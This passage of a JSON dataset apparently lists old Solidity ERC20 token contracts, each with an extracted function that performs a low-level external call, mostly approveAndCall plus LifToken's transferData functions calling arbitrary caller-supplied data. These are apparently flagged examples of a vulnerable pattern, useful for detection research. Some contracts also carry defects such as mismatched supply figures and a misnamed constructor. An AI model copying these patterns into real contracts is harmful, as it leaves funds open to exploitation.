_value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a1"
  },
  "filename": "35186.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 2100000000000000;\n name = \"eTelevision\";\n decimals = 8;\n symbol = \"eTV\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a2"
  },
  "filename": "35209.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract KameraToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n function KameraToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract Kamera is KameraToken(5000000000000000000000000, \"Kamera\", 18, \"KMR\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a3"
  },
  "filename": "35218.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 21000000;\n name = \"Fun Bucks\";\n decimals = 8;\n symbol = \"FUCK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a4"
  },
  "filename": "35249.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n uint256 _allowance = allowed[_from][msg.sender];\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue)\n returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue)\n returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract SmartToken is StandardToken {\n function approveData(address _spender, uint256 _value, bytes _data) returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transferData(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n require(_to.call(_data));\n super.transfer(_to, _value);\n return true;\n }\n function transferDataFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n require(_to.call(_data));\n super.transferFrom(_from, _to, _value);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(0x0, _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract LifToken is SmartToken, MintableToken, Pausable {\n string public constant NAME = \"Líf\";\n string public constant SYMBOL = \"LIF\";\n uint public constant DECIMALS = 18;\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approveData(address spender, uint256 value, bytes data) public whenNotPaused returns (bool) {\n return super.approveData(spender, value, data);\n }\n function transferData(address to, uint256 value, bytes data) public whenNotPaused returns (bool) {\n return super.transferData(to, value, data);\n }\n function transferDataFrom(address from, address to, uint256 value, bytes data) public whenNotPaused returns (bool) {\n return super.transferDataFrom(from, to, value, data);\n }\n function burn(uint256 _value) public whenNotPaused {\n require(_value > 0);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n Transfer(burner, address(0), _value);\n }\n event Burn(address indexed burner, uint value);\n}",
  "extract_feature": [
    "function approveData(address _spender, uint256 _value, bytes _data) returns (bool) {\nrequire(_spender != address(this));\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transferData(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nrequire(_to.call(_data));\nsuper.transfer(_to, _value);\nreturn true;\n}",
    "function transferDataFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nrequire(_to.call(_data));\nsuper.transferFrom(_from, _to, _value);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a5"
  },
  "filename": "35264.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ETHERBLUE is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ETHERBLUE(\n ) {\n balances[msg.sender] = 1000000000000000000000000;\n totalSupply = 1000000000000000000000000;\n name = \"ETHERBLUE\";\n decimals = 18;\n symbol = \"EBLUE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a6"
  },
  "filename": "35269.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DEVCOIN is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function DEVCOIN(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"DEVCOIN\";\n decimals = 18;\n symbol = \"DEV\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a7"
  },
  "filename": "35270.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ORGANIC is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ORGANIC(\n ) {\n balances[msg.sender] = 100000000000000;\n totalSupply = 100000000000000;\n name = \"Organic\";\n decimals = 7;\n symbol = \"ORG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a8"
  },
  "filename": "35286.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 10000000000;\n name = \"Hyborneareum\";\n decimals = 4;\n symbol = \"HBN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15a9"
  },
  "filename": "35307.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000;\n totalSupply = 100000000000000;\n name = \"EUROBITS\";\n decimals = 5;\n symbol = \"EURB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15aa"
  },
  "filename": "35308.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EUROBITS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000;\n totalSupply = 100000000000000;\n name = \"EUROBITS\";\n decimals = 5;\n symbol = \"EURB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
